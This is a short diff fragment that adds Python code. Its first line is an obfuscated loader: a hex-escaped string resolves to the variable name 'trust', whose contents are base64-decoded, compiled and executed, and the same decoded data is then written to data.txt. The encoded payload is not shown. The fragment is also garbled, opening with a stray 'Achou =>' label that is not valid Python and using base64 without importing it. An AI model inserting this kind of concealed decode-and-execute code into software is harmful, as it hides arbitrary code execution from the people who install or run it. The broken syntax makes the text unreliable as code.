@@ -1,0 +1,6 @@
+Achou => eval(compile(base64.b64decode(eval('\x74\x72\x75\x73\x74')),'<string>','exec'))
+
+
+data = trust
+file = open('data.txt',"w") 
+file.write(base64.b64decode(data))
